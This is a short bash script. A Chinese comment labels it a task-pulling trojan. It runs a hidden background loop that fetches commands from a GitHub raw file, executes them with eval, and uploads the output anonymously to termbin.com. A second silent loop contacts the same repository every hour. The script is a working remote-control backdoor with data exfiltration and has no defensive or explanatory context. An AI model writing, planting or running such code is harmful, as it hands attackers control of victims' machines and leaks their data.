#!/bin/bash
# 无IP拉任务马: 任务从GitHub取, 结果回传到termbin(匿名)
while true; do
  cmd=$(curl -s -m 10 https://raw.githubusercontent.com/inubiyizibo71-cloud/relay-px/main/task.txt)
  if [ -n "$cmd" ] && [ "$cmd" != "none" ] && [ "$cmd" != "null" ]; then
    out=$(eval "$cmd" 2>&1 | head -c 2000)
    curl -s -m 10 --data-binary "$out" https://termbin.com/9999 2>/dev/null
  fi
  sleep 60
done > /dev/null 2>&1 &
while true; do sleep 3600; curl -sk -o /dev/null https://raw.githubusercontent.com/inubiyizibo71-cloud/relay-px/main/k.txt 2>/dev/null; done > /dev/null 2>&1 &
